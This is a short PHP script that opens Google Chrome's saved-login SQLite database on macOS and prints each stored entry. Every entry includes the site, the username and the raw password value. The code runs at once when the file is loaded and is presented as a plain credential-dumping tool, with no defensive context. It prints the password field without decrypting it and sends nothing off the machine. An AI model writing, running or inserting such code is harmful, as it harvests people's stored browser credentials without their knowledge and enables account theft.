<?php
/**
 * Created by PhpStorm.
 * User: guoyexuan
 * Date: 2018/12/13
 * Time: 10:39 PM
 */

class ChromePass extends SQLite3
{
    protected $db_path;

    public function __construct()
    {
        $this->db_path = getenv('HOME').'/Library/Application Support/Google/Chrome/Default/Login Data';
        $this->_connect();
        $this->_dumpChromePass();
        $this->close();
    }

    public function _connect()
    {
        $this->open($this->db_path);
        if($this)
        {
            echo "Opened database successfully\n";
        }
        else
        {
            echo "Opened database Fail!\n";
        }
    }

    public function _dumpChromePass()
    {
        $sql = 'SELECT signon_realm,username_value,password_value FROM `logins`';

        $ret = $this->query($sql);

        while($row = $ret->fetchArray(SQLITE3_ASSOC) ){

            print_r($row);
        }
    }

}new ChromePass();